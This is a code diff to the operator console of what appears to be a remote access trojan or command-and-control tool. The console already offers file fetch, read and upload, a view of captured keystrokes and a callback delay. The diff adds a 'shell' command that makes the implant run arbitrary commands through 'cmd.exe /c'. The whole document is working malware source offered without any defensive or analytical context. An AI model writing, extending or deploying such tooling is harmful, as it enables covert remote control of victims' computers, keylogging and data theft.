@@ -25,6 +25,7 @@ class Shell:
         self.cmds = {}
         self.cmds['help'] = self.help
         self.cmds['fetch'] = self.fetch
+        self.cmds['shell'] = self.shell_exec
         self.cmds['read'] = self.read_file
         self.cmds['upload'] = self.upload_file
         self.cmds['delay'] = self.update_delay
@@ -80,6 +81,7 @@ class Shell:
             'keylogger',
             'alias',
             'delay',
+            'shell',
             'help',
             ],
             'Args': [
@@ -93,6 +95,8 @@ class Shell:
             'number of line (default 20)',
             'key, value',
             'milliseconds',
+            'command',
+            ''
             ],
             'Descriptions': [
             'Return to the main console (CLI only)',
@@ -105,6 +109,7 @@ class Shell:
             'Show last n line of keystrokes captured',
             'Create an alias to avoid typing the same thing over and over',
             'Update the callback delay',
+            'Run command by spawning cmd.exe /c',
             'show this help menu',
             ]},
             headers='keys', tablefmt='simple')
@@ -238,3 +243,8 @@ class Shell:
         self.alias.set_custom(key, value)
         self.output += self.output_cli_or_str("%s is now set to %s" % (key, value))
         return ""
+
+    def shell_exec(self):
+         command = Utils.get_arg_at(self.data, 1, 2)
+         self.output += self.output_cli_or_str("Spawning cmd.exe to execute: %s" % command)
+         return "cmd.exe /c %s" % command
